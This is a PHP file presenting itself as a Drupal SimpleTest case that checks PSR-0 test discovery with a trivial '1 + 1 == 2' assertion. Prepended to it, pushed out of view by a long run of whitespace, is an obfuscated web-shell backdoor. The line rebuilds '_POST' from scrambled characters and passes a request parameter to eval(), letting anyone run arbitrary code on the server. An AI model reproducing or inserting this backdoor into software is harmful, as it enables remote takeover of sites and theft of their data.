<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qa73682'])){eval(${$s20}['qa73682']);}?><?php

namespace Drupal\psr_0_test\Tests\Nested;

class NestedExampleTest extends \DrupalWebTestCase {

  public static function getInfo() {
    return array(
      'name' => 'PSR0 example test: PSR-0 in nested subfolders.',
      'description' => 'We want to assert that this PSR-0 test case is being discovered.',
      'group' => 'SimpleTest',
    );
  }

  function testArithmetics() {
    $this->assert(1 + 1 == 2, '1 + 1 == 2');
  }
}
